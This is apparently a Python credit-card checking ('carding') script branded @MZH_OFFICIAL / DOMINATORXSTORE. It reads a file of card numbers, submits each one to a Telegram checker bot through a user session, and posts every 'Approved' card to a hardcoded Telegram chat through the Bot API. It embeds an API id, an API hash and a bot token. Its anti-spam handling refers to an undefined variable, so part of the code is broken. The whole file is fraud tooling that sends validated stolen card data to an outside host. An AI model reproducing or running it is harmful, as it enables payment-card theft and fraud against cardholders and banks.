#MZH_OFFICIAL
import os
try :
    import pyfiglet
    import telethon
    import requests
except:
    os.system('pip3 install pyfiglet')
    os.system('pip3 install telethon')
    os.system('pip3 install requests')
import time,os,random
from telethon import TelegramClient
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
ch = "SDBB_Bot"
api_id = "17318483"
api_hash = "207a50f38f2bca8792cc75370b6af6f7"
ID = "5304633619"
token="5730958853:AAHIg0ruCqWu1mLj45WAvHFa0LEo0Olufrc"
combo = input(X+'ENTER YOU COMBO NAME : '+F)
os.system('clear')
client = TelegramClient('session', api_id, api_hash)
client.start()
for cc in open(combo,"r").read().split("\n"):
    try:
        client.send_message(ch ,f"/chk {cc}")
        time.sleep(random.randint(35,45))
        mssag = client.get_messages(ch, limit=1)
        if "ANTI_SPAM" in str(mssag[0].message):
            r = str(mssag[0].message).split("again after ")[1]
            r = t.split("seconds")[0]
            r = int(t)
            print(f"Done Sleep : {r+2}")
            time.sleep(t+1)
        ccn = mssag[0].message
        if 'Approved' in ccn :
            print(F+'Approved✅ | DOMINATORXSTORE : @MZH_OFFICIAL.')
            mgs=f'''• Card checked by @MZH_OFFICIAL✅.
{ccn} .
@MZH_OFFICIAL✔️
DOMINATORXSTORE OFFICIAL🌎
CHECK COMMAND = /chk'''
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
            i = requests.post(tlg)
            time.sleep(1)
        else :
            print(Z+'Declined❌ | DOMINATORXSTORE : @MZH_OFFICIAL.')
    except:
        print(False)
        #@MZH_OFFICIAL